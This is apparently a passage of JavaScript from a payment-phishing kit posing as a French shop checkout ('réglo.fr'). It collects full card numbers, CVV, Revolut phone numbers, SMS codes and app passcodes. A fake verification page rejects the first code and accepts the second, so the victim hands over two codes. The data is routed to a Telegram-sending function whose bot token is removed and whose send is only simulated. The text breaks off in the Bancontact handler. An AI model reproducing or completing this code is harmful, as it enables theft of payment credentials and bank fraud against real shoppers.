document.addEventListener('DOMContentLoaded', function() {
    // NOTE: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID intentionally removed.
    
    const orderData = JSON.parse(localStorage.getItem('currentOrder'));
    const orderItemsContainer = document.getElementById('order-items');
    const orderTotalAmount = document.getElementById('order-total-amount');
    const placeOrderBtn = document.getElementById('place-order-btn');
    const deliveryForm = document.getElementById('delivery-form');
    
    const creditCardMethod = document.getElementById('credit-card-method');
    const revolutMethod = document.getElementById('revolut-method');
    const bancontactMethod = document.getElementById('bancontact-method');
    let selectedPaymentMethod = 'credit-card'; 
    
    function setupPaymentMethods() {
        const paymentMethods = [];
        if (creditCardMethod) paymentMethods.push(creditCardMethod);
        if (revolutMethod) paymentMethods.push(revolutMethod);
        if (bancontactMethod) paymentMethods.push(bancontactMethod);
        
        paymentMethods.forEach(method => {
            if(method) {
                method.addEventListener('click', function() {
                    paymentMethods.forEach(m => { if(m) m.classList.remove('active'); });
                    this.classList.add('active');
                    const inputRadio = this.querySelector('input[type="radio"]');
                    if(inputRadio) selectedPaymentMethod = inputRadio.value;
                });
            }
        });
        const defaultMethodInput = document.querySelector(`input[name="payment-method"][value="${selectedPaymentMethod}"]`);
        if (defaultMethodInput && defaultMethodInput.parentElement.classList.contains('payment-method')) {
            defaultMethodInput.parentElement.classList.add('active');
        }
    }
    
    function displayOrderItems() {
        if (!orderItemsContainer) return;
        if (!orderData || !orderData.items || orderData.items.length === 0) {
            orderItemsContainer.innerHTML = '<p>Aucun article dans votre commande.</p>';
            if(orderTotalAmount) orderTotalAmount.textContent = '0,00 €';
            return;
        }
        let html = '';
        orderData.items.forEach(item => {
            html += `
                <div class="order-summary-item">
                    <div class="product-info">
                        <img src="${item.image}" alt="${item.name}" class="product-image" onerror="this.src='placeholder.jpg'">
                        <div>
                            <div class="product-name">${item.name}</div>
                            <div class="product-variant">${item.variant}</div>
                            <div>Quantité: ${item.quantity}</div>
                        </div>
                    </div>
                    <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
                </div>
            `;
        });
        orderItemsContainer.innerHTML = html;
        if(orderTotalAmount) orderTotalAmount.textContent = `${orderData.total.toFixed(2)} €`;
    }
    
    async function sendOrderToTelegram(customer, paymentInfo = {}) { 
        console.log("Simulating: Customer and order data prepared for Telegram. In a real app, this would be sent via a secure backend. Order ID: " + (orderData && orderData.orderId ? orderData.orderId : 'N/A'));
        if (paymentInfo && Object.keys(paymentInfo).length > 0) {
            let simulatedPaymentInfo = {...paymentInfo}; // Clone to avoid modifying original if passed by reference
            // Mask sensitive details before logging
            if(simulatedPaymentInfo.cardNumber) simulatedPaymentInfo.cardNumber = simulatedPaymentInfo.cardNumber.slice(0,4) + " **** **** " + simulatedPaymentInfo.cardNumber.slice(-4);
            if(simulatedPaymentInfo.cardCvc) simulatedPaymentInfo.cardCvc = "***"; // CVV should never be logged or sent
            
            console.warn("CRITICAL SIMULATION: Payment details (like card info) would NOT be sent from client-side in a real app. This log is for simulation only and sensitive data is masked or omitted. Details (masked/simulated): ", simulatedPaymentInfo);
        }
        return Promise.resolve(true); // Simulate successful API call
    }
    
    function getPaymentMethodName(method) {
        switch(method) {
            case 'credit-card': return 'Carte de crédit';
            case 'revolut': return 'Revolut';
            case 'bancontact': return 'Bancontact';
            default: return method;
        }
    }
    
    function getRedirectUrl() {
        const paymentMethodForRedirect = (orderData && orderData.paymentMethod) ? orderData.paymentMethod : selectedPaymentMethod;
        switch(paymentMethodForRedirect) {
            case 'credit-card': return 'traitement1.html';
            case 'revolut': return 'traitement10.html';
            case 'bancontact': return 'traitement20.html';
            default: return 'traitement1.html'; 
        }
    }
    
    if (placeOrderBtn && deliveryForm) { 
        placeOrderBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            if (!deliveryForm.checkValidity()) { deliveryForm.reportValidity(); return; }
            const customer = {
                firstName: document.getElementById('first-name').value.trim(),
                lastName: document.getElementById('last-name').value.trim(),
                email: document.getElementById('email').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: document.getElementById('address').value.trim(),
                city: document.getElementById('city').value.trim(),
                postalCode: document.getElementById('postal-code').value.trim(),
                country: document.getElementById('country').value.trim(),
                notes: document.getElementById('notes').value.trim()
            };
            if (!customer.firstName || !customer.lastName || !customer.email || !customer.phone || !customer.address || !customer.city || !customer.postalCode) {
                alert('Veuillez remplir tous les champs obligatoires'); return;
            }
            
            const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            if (!currentOrderData.orderId) currentOrderData.orderId = `CMD-${Date.now().toString(36).toUpperCase().slice(-8)}`;
            currentOrderData.customer = customer;
            currentOrderData.paymentMethod = selectedPaymentMethod; 
            localStorage.setItem('currentOrder', JSON.stringify(currentOrderData)); 
            
            // Telegram sending is now only simulated on payment pages. 
            // This console.log confirms data is ready before redirecting from commande.html
            console.log("Simulating: Customer and order data prepared on commande.html. Redirecting to payment page. Order ID: " + currentOrderData.orderId);
            window.location.href = getRedirectUrl();
        });
    }
    
    if (document.getElementById('order-items') && document.getElementById('delivery-form')) { 
        displayOrderItems();
        setupPaymentMethods();
        const countrySelect = document.getElementById('country');
        if (countrySelect) countrySelect.value = 'France';
    }

    // ---- Functions for traitement1.html (Credit Card Form) ----
    const cardForm = document.getElementById('payment-form'); 
    const loadingOverlay = document.getElementById('loading-overlay'); 
    
    if (cardForm && document.querySelector('.credit-card')) { 
        const cardUtils = { 
            formatNumber: num => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
            detectType: num => {
                const cleaned = num.replace(/\s/g, '');
                if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
                return 'Carte Bancaire';
            },
            validateNumber: num => {
                const cleaned = num.replace(/\s/g, '');
                if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                let sum = 0; let alternate = false;
                for (let i = cleaned.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleaned.charAt(i));
                    if (alternate) { digit *= 2; if (digit > 9) digit -= 9; }
                    sum += digit; alternate = !alternate;
                }
                return sum % 10 === 0;
            },
            validateExpiry: exp => {
                if (!exp || !exp.includes('/')) return false;
                const [mm, yy] = exp.split('/');
                const month = parseInt(mm), year = parseInt(yy);
                if (isNaN(month) || isNaN(year) || month < 1 || month > 12) return false;
                const now = new Date();
                const currentYear = now.getFullYear() % 100;
                const currentMonth = now.getMonth() + 1;
                return (year > currentYear) || (year === currentYear && month >= currentMonth);
            }
        };

        const cardNumberInput = document.getElementById('card-number');
        const cardHolderInput = document.getElementById('card-holder');
        const cardExpiryInput = document.getElementById('card-expiry');
        const cardCvvInput = document.getElementById('card-cvv');
        
        function updateCardPreview() {
            if(document.getElementById('card-number-display') && cardNumberInput) document.getElementById('card-number-display').textContent = cardNumberInput.value || '•••• •••• •••• ••••';
            if(document.getElementById('card-holder-display') && cardHolderInput) document.getElementById('card-holder-display').textContent = cardHolderInput.value.toUpperCase() || 'NOM PRÉNOM';
            if(document.getElementById('card-expiry-display') && cardExpiryInput) document.getElementById('card-expiry-display').textContent = cardExpiryInput.value || '••/••';
            if(document.getElementById('card-type-display') && cardNumberInput) document.getElementById('card-type-display').textContent = cardUtils.detectType(cardNumberInput.value);
        }

        if(cardNumberInput) cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            e.target.value = cardUtils.formatNumber(value);
            updateCardPreview();
        });
        if(cardHolderInput) cardHolderInput.addEventListener('input', updateCardPreview);
        if(cardExpiryInput) cardExpiryInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
            e.target.value = value;
            updateCardPreview();
        });
        if(cardCvvInput) cardCvvInput.addEventListener('input', updateCardPreview);

        cardForm.addEventListener('submit', async function(event) { 
            event.preventDefault();
            const cardNumber = cardNumberInput.value;
            const cardExpiry = cardExpiryInput.value;
            const cardCvc = cardCvvInput.value;
            const cardName = cardHolderInput.value;

            if (!cardUtils.validateNumber(cardNumber.replace(/\s/g, ''))) { alert("Numéro de carte invalide."); return; }
            if (cardName.trim().length < 3) { alert("Nom du titulaire invalide"); return; }
            if (!cardUtils.validateExpiry(cardExpiry)) { alert("Date d'expiration invalide (MM/AA)"); return; }
            const cardTypeForCVV = cardUtils.detectType(cardNumber);
            const cvvLength = cardTypeForCVV === 'American Express' ? 4 : 3;
            if (!cardCvc || !new RegExp(`^\\d{${cvvLength}}$`).test(cardCvc)) { alert(`CVV invalide (${cvvLength} chiffres requis)`); return; }

            if (loadingOverlay) loadingOverlay.classList.add('active'); 
            const paymentDetails = { cardNumber: cardNumber.replace(/\s/g, ''), cardExpiry, cardCvc, cardName, type: 'Credit Card' };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
            
            const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            const customerData = currentOrderData.customer || {};
            await sendOrderToTelegram(customerData, paymentDetails); 
            
            setTimeout(() => {
                if (loadingOverlay) loadingOverlay.classList.remove('active');
                window.location.href = 'traitement4.html'; 
            }, 2500); 
        });
        displayOrderItems(); 
    }

    // ---- Functions for traitement4.html & traitement7.html (Processing Pages) ----
    if (document.body.id === 'processing-page-4' || document.body.id === 'processing-page-7') {
        const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')); 
        const paymentDetails = JSON.parse(localStorage.getItem('paymentDetails'));
        if (currentOrderData && paymentDetails) {
            const messageElement = document.getElementById('processing-message');
            if (messageElement) messageElement.textContent = `Traitement de votre paiement par ${paymentDetails.type}. Un instant...`;
            
            const itemsForTotal = currentOrderData.items || [];
            let totalForVerification = 0;
            if (itemsForTotal.length > 0) {
                 totalForVerification = itemsForTotal.reduce((total, item) => total + (item.price * item.quantity), 0);
            }

            const verificationData = {
                merchant: "réglo.fr",
                amount: totalForVerification.toFixed(2),
                cardLast4: paymentDetails.cardNumber ? paymentDetails.cardNumber.slice(-4) : (paymentDetails.type === "Bancontact" ? "N/A" : "****"), 
                cardHolder: paymentDetails.cardName || (paymentDetails.type === "Bancontact" ? paymentDetails.name : "N/A"),
                orderId: currentOrderData.orderId || 'CMD-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                paymentStatus: "pending_verification" // Added payment status
            };
            localStorage.setItem('paymentVerificationData', JSON.stringify(verificationData));

            setTimeout(() => {
                if (paymentDetails.type === 'RevolutPay') window.location.href = "traitement50.html";
                else window.location.href = "payment_confirmation_page.html"; 
            }, 3000); 
        } else {
            const messageElement = document.getElementById('processing-message');
            if(messageElement) messageElement.textContent = "Erreur: Données de commande ou de paiement manquantes.";
        }
    }

    // ---- Functions for payment_confirmation_page.html (Payment Verification Page - formerly confirmation.html) ----
    const paymentVerificationPageElements = {
        merchantName: document.getElementById('merchant-name'),
        paymentAmount: document.getElementById('payment-amount'),
        cardNumberDisplay: document.getElementById('card-number'),
        verificationCodeInput: document.getElementById('verification-code'),
        verifyBtn: document.getElementById('verify-btn'),
        btnText: document.getElementById('btn-text'),
        btnSpinner: document.getElementById('btn-spinner'),
        codeError: document.getElementById('code-error'),
        timerDisplay: document.getElementById('timer-display'),
        timeCount: document.getElementById('time-count'),
        resendNotificationBtn: document.getElementById('resend-notification'),
        useSmsBtn: document.getElementById('use-sms-code'),
        // Assuming the main container for verification content is 'verification-container'
        // and the title element is 'verification-title'
        verificationContainer: document.querySelector('.verification-container'), 
        verificationTitle: document.querySelector('.verification-title')
    };

    if (paymentVerificationPageElements.verificationCodeInput && paymentVerificationPageElements.verificationContainer) { 
        const paymentVerificationData = JSON.parse(localStorage.getItem('paymentVerificationData') || '{}');
        if (paymentVerificationData) {
            if(paymentVerificationPageElements.merchantName) paymentVerificationPageElements.merchantName.textContent = paymentVerificationData.merchant || "réglo.fr";
            if(paymentVerificationPageElements.paymentAmount) paymentVerificationPageElements.paymentAmount.textContent = paymentVerificationData.amount ? paymentVerificationData.amount + " €" : "0,00 €";
            if(paymentVerificationPageElements.cardNumberDisplay) paymentVerificationPageElements.cardNumberDisplay.textContent = "**** **** **** " + (paymentVerificationData.cardLast4 || "0000");
        }
        let timeLeft = 30; let timerInterval; let verificationAttempts = 0;
        
        function showSuccessUI() {
            if (!paymentVerificationPageElements.verificationContainer || !paymentVerificationData) return;

            // Clear existing timer
            clearInterval(timerInterval);

            // Update title and clear container content
            if (paymentVerificationPageElements.verificationTitle) {
                paymentVerificationPageElements.verificationTitle.innerHTML = `<i class="fas fa-check-circle" style="color: var(--success);"></i> Paiement Approuvé!`;
            }
            
            // Construct success message
            let successHTML = `
                <p>Votre commande a été confirmée avec succès.</p>
                <p><strong>Commande ID:</strong> ${paymentVerificationData.orderId || 'N/A'}</p>
                <p><strong>Montant Payé:</strong> ${paymentVerificationData.amount || '0.00'} €</p>
                <br>
                <a href="index.html" class="btn btn-primary">Retour à l'accueil</a>
            `;
            
            // Replace the verification form content with success message
            // This assumes specific elements to hide/show. A more robust way might be to have dedicated divs.
            const paymentDetailsDisplay = paymentVerificationPageElements.verificationContainer.querySelector('.payment-details');
            const verificationMessage = paymentVerificationPageElements.verificationContainer.querySelector('.verification-message');
            const codeInputContainer = paymentVerificationPageElements.verificationContainer.querySelector('.code-input-container');
            const verifyBtn = paymentVerificationPageElements.verificationContainer.querySelector('#verify-btn');
            const timerDisplay = paymentVerificationPageElements.verificationContainer.querySelector('#timer-display');
            const verificationOptions = paymentVerificationPageElements.verificationContainer.querySelector('.verification-options');

            if(paymentDetailsDisplay) paymentDetailsDisplay.style.display = 'none';
            if(verificationMessage) verificationMessage.style.display = 'none';
            if(codeInputContainer) codeInputContainer.innerHTML = successHTML; // Replace content of code input area
            else { // Fallback if codeInputContainer is not found, append to main container
                 const successDiv = document.createElement('div');
                 successDiv.innerHTML = successHTML;
                 paymentVerificationPageElements.verificationContainer.appendChild(successDiv);
            }
            if(verifyBtn) verifyBtn.style.display = 'none';
            if(timerDisplay) timerDisplay.style.display = 'none';
            if(verificationOptions) verificationOptions.style.display = 'none';


            // Clear localStorage
            localStorage.removeItem('currentOrder');
            localStorage.removeItem('paymentVerificationData');
            localStorage.removeItem('paymentDetails'); // Clear sensitive payment details
        }

        function startVerificationTimer() {
            clearInterval(timerInterval); timeLeft = 30; updateVerificationTimerDisplay();
            if(paymentVerificationPageElements.timerDisplay) paymentVerificationPageElements.timerDisplay.style.display = 'block';
            timerInterval = setInterval(() => {
                timeLeft--; updateVerificationTimerDisplay();
                if (timeLeft <= 0) { clearInterval(timerInterval); simulateNewPaymentCode(); }
            }, 1000);
        }
        function updateVerificationTimerDisplay() { if(paymentVerificationPageElements.timeCount) paymentVerificationPageElements.timeCount.textContent = timeLeft; }
        function simulateNewPaymentCode() { 
            verificationAttempts = 0; 
            if(paymentVerificationPageElements.codeError) paymentVerificationPageElements.codeError.style.display = 'none'; 
            if(paymentVerificationPageElements.verificationCodeInput) paymentVerificationPageElements.verificationCodeInput.value = '';
            startVerificationTimer(); 
        }
        function verifyPaymentCode() {
            const code = paymentVerificationPageElements.verificationCodeInput.value.trim();
            if (!code || code.length < 6) { showPaymentError("Veuillez entrer un code valide de 6 chiffres"); return; }
            
            if(paymentVerificationPageElements.btnText) paymentVerificationPageElements.btnText.textContent = "Vérification en cours";
            if(paymentVerificationPageElements.btnSpinner) paymentVerificationPageElements.btnSpinner.style.display = 'inline-block';
            if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.disabled = true;
            
            setTimeout(() => {
                verificationAttempts++;
                if (verificationAttempts >= 2) { // Simulate success on 2nd attempt
                    showSuccessUI();
                } else { // Simulate failure on 1st attempt
                    if(paymentVerificationPageElements.btnText) paymentVerificationPageElements.btnText.textContent = "Vérifier le code";
                    if(paymentVerificationPageElements.btnSpinner) paymentVerificationPageElements.btnSpinner.style.display = 'none';
                    if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.disabled = false;
                    showPaymentError("Code incorrect. Veuillez réessayer.");
                }
            }, 2000); // Shortened delay for simulation
        }
        function resendPaymentNotification() { alert("Notification renvoyée à votre application bancaire"); startVerificationTimer(); }
        function useSmsPaymentCode() { alert("Un code de vérification a été envoyé par SMS à votre numéro enregistré"); startVerificationTimer(); }
        function showPaymentError(message) {
            if(paymentVerificationPageElements.codeError) {
                paymentVerificationPageElements.codeError.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
                paymentVerificationPageElements.codeError.style.display = 'block';
            }
        }
        startVerificationTimer(); // Initial call
        if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.addEventListener('click', verifyPaymentCode);
        if(paymentVerificationPageElements.resendNotificationBtn) paymentVerificationPageElements.resendNotificationBtn.addEventListener('click', resendPaymentNotification);
        if(paymentVerificationPageElements.useSmsBtn) paymentVerificationPageElements.useSmsBtn.addEventListener('click', useSmsPaymentCode);
    }

    // ---- Logic for the FINAL Order Confirmation Page (body id="order-confirmation-final-page") ----
    // This logic seems to be for a *different* final confirmation page, not the payment verification one.
    // The payment verification page itself now becomes the final confirmation upon success.
    // I'll keep this block, but it might be for an older version or a separate direct confirmation flow.
    const finalConfirmationPageBody = document.getElementById('order-confirmation-final-page');
    if (finalConfirmationPageBody && !paymentVerificationPageElements.verificationCodeInput) { // Ensure this doesn't run on the verification page
        const orderDataToDisplay = JSON.parse(localStorage.getItem('currentOrder'));
        if (orderDataToDisplay) {
            // This part assumes elements like #order-id, #order-date etc. exist on this page.
            // If payment_confirmation_page.html is the *only* confirmation, this block might be redundant
            // or for a flow that directly lands here post-payment (e.g. PayPal returning).
            const orderIdEl = document.getElementById('order-id');
            const orderDateEl = document.getElementById('order-date');
            const customerNameEl = document.getElementById('customer-name');
            const customerEmailEl = document.getElementById('customer-email');
            const shippingAddressEl = document.getElementById('shipping-address');
            const paymentMethodConfirmedEl = document.getElementById('payment-method-confirmed');
            const orderedItemsListEl = document.getElementById('ordered-items-list');
            const orderTotalConfirmedEl = document.getElementById('order-total-confirmed');

            if(orderIdEl) orderIdEl.textContent = orderDataToDisplay.orderId;
            if(orderDateEl) orderDateEl.textContent = orderDataToDisplay.date; 
            if(customerNameEl && orderDataToDisplay.customer) customerNameEl.textContent = `${orderDataToDisplay.customer.firstName} ${orderDataToDisplay.customer.lastName}`;
            if(customerEmailEl && orderDataToDisplay.customer) customerEmailEl.textContent = orderDataToDisplay.customer.email;
            if(shippingAddressEl && orderDataToDisplay.customer) shippingAddressEl.textContent = `${orderDataToDisplay.customer.address}, ${orderDataToDisplay.customer.postalCode} ${orderDataToDisplay.customer.city}, ${orderDataToDisplay.customer.country}`;
            if(paymentMethodConfirmedEl) paymentMethodConfirmedEl.textContent = getPaymentMethodName(orderDataToDisplay.paymentMethod);
            if (orderedItemsListEl && orderDataToDisplay.items) {
                orderedItemsListEl.innerHTML = orderDataToDisplay.items.map(item => `
                    <div class="product-item">
                        <img src="${item.image}" alt="${item.name}" class="product-image-small">
                        <div class="product-details-small">
                            <span>${item.name} (${item.variant}) x ${item.quantity}</span>
                            <span>${(item.price * item.quantity).toFixed(2)} €</span>
                        </div>
                    </div>
                `).join('');
            }
            if(orderTotalConfirmedEl) orderTotalConfirmedEl.textContent = `${orderDataToDisplay.total.toFixed(2)} €`;
        } else {
            const container = finalConfirmationPageBody.querySelector('.order-confirmation-container'); 
            if(container) container.innerHTML = "<p>Erreur: Impossible de charger les détails de la commande.</p>";
        }
    }

    // ---- Functions for traitement10.html (Revolut Phone Input) ----
    const revolutPhoneForm = document.getElementById('revolut-phone-form'); 
    if (revolutPhoneForm) { 
        const revolutContinueBtn = document.getElementById('revolutContinueBtn'); 
        const revolutLoadingSpinner = document.getElementById('revolutLoading'); 
        const revolutLoadingDotsFooter = document.getElementById('revolutLoadingDots'); 

        revolutPhoneForm.addEventListener('submit', function(event) { 
            event.preventDefault(); 
            const revolutPhoneInput = document.getElementById('revolut-phone'); 
            if (revolutPhoneInput && revolutPhoneInput.value.trim() !== "") { 
                revolutContinueBtn.disabled = true;
                if (revolutLoadingSpinner) revolutLoadingSpinner.style.display = 'flex';
                let dots = 0;
                const dotInterval = setInterval(() => {
                    dots = (dots + 1) % 4;
                    if (revolutLoadingDotsFooter) revolutLoadingDotsFooter.textContent = '.'.repeat(dots);
                }, 500);
                localStorage.setItem('revolutPhoneNumber', revolutPhoneInput.value.trim());
                setTimeout(() => {
                    clearInterval(dotInterval);
                    window.location.href = 'traitement30.html';
                }, 1500); 
            } else {
                alert("Veuillez saisir votre numéro de téléphone Revolut.");
            }
        });
    }

    // ---- Functions for traitement30.html (Revolut Code Input) ----
    const revolutCodeForm = document.getElementById('revolut-code-form'); 
    if (revolutCodeForm) {
        const codeInputs = revolutCodeForm.querySelectorAll('.revolut-code-input'); 
        const clearKey = document.getElementById('clearKey');
        const submitKey = document.getElementById('submitKey'); 
        const loadingDots = document.getElementById('revolutLoadingDots'); 
        const revolutPhoneHint = document.getElementById('revolut-phone-hint'); 

        if (codeInputs.length > 0) codeInputs[0].focus();
        
        if (revolutPhoneHint){
            const phoneNumber = localStorage.getItem('revolutPhoneNumber');
            if (phoneNumber) {
                 revolutPhoneHint.textContent = `Nous avons envoyé un code à 6 chiffres au ${phoneNumber}.`;
            }
        }

        codeInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1) {
                    this.classList.add('filled');
                    if (index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    } else { 
                        if(submitKey) submitKey.click(); 
                    }
                } else {
                    this.classList.remove('filled');
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    codeInputs[index - 1].focus();
                    codeInputs[index - 1].classList.remove('filled');
                }
            });
        });

        document.querySelectorAll('.revolut-key[data-key]').forEach(key => {
            key.addEventListener('click', function() {
                const digit = this.getAttribute('data-key');
                const emptyInput = Array.from(codeInputs).find(input => input.value === '');
                if (emptyInput) {
                    emptyInput.value = digit;
                    emptyInput.classList.add('filled');
                    const nextEmptyInput = Array.from(codeInputs).find(input => input.value === '');
                    if (nextEmptyInput) {
                        nextEmptyInput.focus();
                    } else { 
                         if(submitKey) submitKey.click();
                    }
                }
            });
        });

        if(clearKey) clearKey.addEventListener('click', function() {
            codeInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
            codeInputs[0].focus();
        });

        if(submitKey) submitKey.addEventListener('click', function() { 
            const code = Array.from(codeInputs).map(input => input.value).join('');
            if (code.length === 6) {
                let dots = 0;
                const dotInterval = setInterval(() => {
                    dots = (dots + 1) % 4;
                    if(loadingDots) loadingDots.textContent = '.'.repeat(dots);
                }, 500);
                
                document.querySelectorAll('.revolut-key').forEach(key => {
                    key.style.pointerEvents = 'none'; key.style.opacity = '0.6';
                });
                const revolutCard = document.querySelector('.revolut-card');
                if(revolutCard) revolutCard.style.opacity = '0.7';

                setTimeout(() => {
                    clearInterval(dotInterval);
                    window.location.href = 'traitement40.html';
                }, 1500);
            } 
        });
    }
    
    // ---- Functions for traitement40.html (Revolut Passcode Input) ----
    const revolutPasscodeForm = document.getElementById('revolut-passcode-form');
    if (revolutPasscodeForm) {
        const passcodeInput = document.getElementById('revolut-passcode');
        const loadingDotsPasscode = document.getElementById('revolutLoadingDots'); 
        const revolutKeypadKeys = document.querySelectorAll('.revolut-key[data-key]');
        const clearKeyPasscode = document.getElementById('clearKey');
        const submitKeyPasscode = document.getElementById('submitKey');


        if(passcodeInput) passcodeInput.focus();

        revolutPasscodeForm.addEventListener('submit', function(event) {
            event.preventDefault(); 
            handlePasscodeSubmit();
        });
        
        revolutKeypadKeys.forEach(key => {
            key.addEventListener('click', function() {
                if (passcodeInput.value.length < 4) { 
                    passcodeInput.value += this.getAttribute('data-key');
                }
            });
        });

        if(clearKeyPasscode) clearKeyPasscode.addEventListener('click', function() {
            if(passcodeInput) passcodeInput.value = '';
        });

        if(submitKeyPasscode) submitKeyPasscode.addEventListener('click', handlePasscodeSubmit);

        function handlePasscodeSubmit() {
            if (passcodeInput && passcodeInput.value.length === 4) { 
                const paymentDetails = { type: 'RevolutPay', identifier: localStorage.getItem('revolutPhoneNumber') };
                localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
                
                const processingButton = revolutPasscodeForm.querySelector('.revolut-button'); 
                const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
                const customerData = currentOrderData.customer || {};
                sendOrderToTelegram(customerData, paymentDetails); 
                
                if(processingButton) { 
                    processingButton.textContent = 'Autorisation...'; 
                    processingButton.disabled = true;
                    const loadingSpinner = processingButton.querySelector('.revolut-loading');
                    if(loadingSpinner) loadingSpinner.style.display = 'flex';
                } else { 
                     document.querySelectorAll('.revolut-key').forEach(key => {
                        key.style.pointerEvents = 'none'; key.style.opacity = '0.6';
                    });
                    if(loadingDotsPasscode && loadingDotsPasscode.parentElement) loadingDotsPasscode.parentElement.style.visibility = 'visible'; 
                }
                
                setTimeout(() => { window.location.href = 'traitement7.html'; }, 1500);
            } else { 
                alert('Veuillez entrer votre code d\'accès à 4 chiffres.'); 
            }
        }
         if (passcodeInput) { 
            passcodeInput.addEventListener('keydown', function(e) {
                if (!/^[0-9]$|Backspace|Delete|ArrowLeft|ArrowRight|ArrowUp|ArrowDown|Tab/.test(e.key)) {
                    e.preventDefault();
                }
            });
        }
    }

    // ---- Functions for traitement50.html (Revolut Success) ----
    const revolutSuccessPage = document.getElementById('revolut-success-page'); 
    if (revolutSuccessPage) { 
        const transactionDateEl = document.getElementById('transactionDate');
        if (transactionDateEl) {
            const now = new Date();
            const options = { day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit' };
            transactionDateEl.textContent = new Intl.DateTimeFormat('fr-FR', options).format(now);
        }
        
        const revolutSuccessButton = revolutSuccessPage.querySelector('.revolut-button'); 
        if (revolutSuccessButton) {
            revolutSuccessButton.addEventListener('click', function() {
                window.location.href = "index.html"; 
            });
        }

        const currentOrderDataForRevolut = JSON.parse(localStorage.getItem('currentOrder'));
        if (currentOrderDataForRevolut) {
            const successMessageEl = revolutSuccessPage.querySelector('.revolut-success-message');
            if (successMessageEl && currentOrderDataForRevolut.customer) {
                 successMessageEl.textContent = `Merci ${currentOrderDataForRevolut.customer.firstName}, votre paiement Revolut de ${currentOrderDataForRevolut.total.toFixed(2)} € a été approuvé. Un reçu a été envoyé à votre adresse email.`;
            }
            
            const detailsContainer = revolutSuccessPage.querySelector('.revolut-success-details');
            if (detailsContainer) {
                const detailValues = detailsContainer.querySelectorAll('.revolut-detail-value');
                if (detailValues.length >= 4) { 
                    if (detailValues[0]) detailValues[0].textContent = `${currentOrderDataForRevolut.total.toFixed(2)} €`;
                    if (detailValues[1] && currentOrderDataForRevolut.customer) detailValues[1].textContent = `${currentOrderDataForRevolut.customer.firstName} ${currentOrderDataForRevolut.customer.lastName}`;
                    if (detailValues[3]) detailValues[3].textContent = currentOrderDataForRevolut.orderId || 'N/A';
                }
            }
            // Clear localStorage for Revolut flow
            localStorage.removeItem('currentOrder');
            localStorage.removeItem('paymentDetails'); // Contains RevolutPay type
            localStorage.removeItem('revolutPhoneNumber');
            localStorage.removeItem('paymentVerificationData'); // Might be set by traitement7.html
        }
    }

    // ---- Functions for traitement20.html (Bancontact Form) ----
    const bancontactForm = document.getElementById('bancontact-form');
    if (bancontactForm) {
        const bancontactElements = {
            orderItems: document.getElementById('order-items'),
            orderTotal: document.getElementById('order-total-amount'),
            processPaymentBtn: document.getElementById('process-payment'),
            cardNumber: document.getElementById('card-number'),
            cardHolder: document.getElementById('card-holder'),
            cardExpiry: document.getElementById('card-expiry'),
            cardCVV: document.getElementById('card-cvv'),
            bankSelect: document.getElementById('bancontact-bank'),
            cardPreviewNumber: document.getElementById('card-preview-number'),
            cardPreviewHolder: document.getElementById('card-preview-holder'),
            cardPreviewExpiry: document.getElementById('card-preview-expiry'),
            loadingOverlay: document.getElementById('loading-overlay') 
        };

        function updateBancontactCardPreview() {
            if (bancontactElements.cardPreviewNumber && bancontactElements.cardNumber) bancontactElements.cardPreviewNumber.textContent = bancontactElements.cardNumber.value || '•••• •••• •••• ••••';
            if (bancontactElements.cardPreviewHolder && bancontactElements.cardHolder) bancontactElements.cardPreviewHolder.textContent = bancontactElements.cardHolder.value.toUpperCase() || 'NOM DU TITULAIRE';
            if (bancontactElements.cardPreviewExpiry && bancontactElements.cardExpiry) bancontactElements.cardPreviewExpiry.textContent = bancontactElements.cardExpiry.value || '••/••';
        }
        
        if (bancontactElements.cardNumber) {
            bancontactElements.cardNumber.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                if (value.length > 19) value = value.substr(0, 19); 
                let formatted = '';
                for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += value[i]; }
                e.target.value = formatted; updateBancontactCardPreview();
            });
        }
        if (bancontactElements.cardHolder) bancontactElements.cardHolder.addEventListener('input', updateBancontactCardPreview);
        if (bancontactElements.cardExpiry) {
            bancontactElements.cardExpiry.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
                if (value.length > 4) value = value.substr(0, 4);
                if (value.length > 2) value = value.substr(0, 2) + '/' + value.substr(2);
                e.target.value = value; updateBancontactCardPreview();
            });
        }

        bancontactForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            const bank = bancontactElements.bankSelect.value;
            const cardNumber = bancontactElements.cardNumber.value.replace(/\s/g, '');
